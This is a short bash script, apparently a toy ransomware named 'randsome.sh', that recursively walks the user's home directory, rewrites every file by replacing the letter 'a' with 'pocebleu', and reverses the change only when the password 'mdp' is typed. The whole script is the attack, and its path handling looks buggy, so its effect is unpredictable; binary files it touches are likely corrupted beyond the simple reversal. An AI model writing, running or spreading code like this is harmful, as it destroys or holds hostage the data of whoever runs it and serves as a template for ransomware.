#! /bin/bash

crypt()
{
    cat $i | sed 's/a/pocebleu/g' > $i.tmp
    cat $i.tmp > $i
    rm $i.tmp

}
decrypt()
{
    cat $i | sed 's/pocebleu/a/g' > $i.tmp
    cat $i.tmp > $i
    rm $i.tmp

}
cryptfolder()
{
    for i in $(ls $1) 
    do
        if [ "$i" != "randsome.sh" ];
        then
            if ! [ -f $i ];
            then 
                #crypt $i
                echo dossier $1/$i
                cryptfolder $1/$i
            else
                echo "    fichier" $1/$i
               crypt $i
            fi
        fi
    done

}
decryptfolder()
{
    for i in $(ls $1) 
    do
        if [ "$i" != "randsome.sh" ];
        then
            if ! [ -f $i ];
            then 
                #crypt $i
                echo dosier $1/$i
                decryptfolder $1/$i
            else
                echo "    fichier" $1/$i
               decrypt $i
            fi
        fi
    done

}

init()
{
    cat .pocebleu 2> /dev/null
    b=$?
    cd ~

    if [ $b -eq 1 ];
    then 
        cryptfolder ~
        cd -
        echo pocebleu > .pocebleu
    else
        read pb
        if [ "$pb" == "mdp" ];
        then
            decryptfolder ~
            rm .pocebleu
        else
            echo "Wrong password"
        fi 
    fi


}
init 
